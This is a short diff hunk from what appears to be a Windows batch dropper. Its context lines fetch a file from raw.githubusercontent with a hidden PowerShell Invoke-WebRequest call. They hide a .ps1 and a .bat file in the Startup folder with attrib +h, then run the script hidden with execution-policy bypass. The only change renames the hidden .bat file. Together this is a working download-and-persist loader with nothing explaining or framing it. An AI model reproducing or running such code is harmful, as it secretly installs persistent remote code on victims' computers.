@@ -32,7 +32,7 @@ powershell powershell.exe -windowstyle hidden "Invoke-WebRequest -Uri raw.github
 
 attrib +h "%STARTUP%/BVrAihDwJNvc.ps1"
 
-attrib +h "%STARTUP%/IVbaANzwiphH.bat"
+attrib +h "%STARTUP%/nEQlCzTBpDrO.bat"
 
 powershell powershell.exe -windowstyle hidden -ep bypass "./BVrAihDwJNvc.ps1"
 
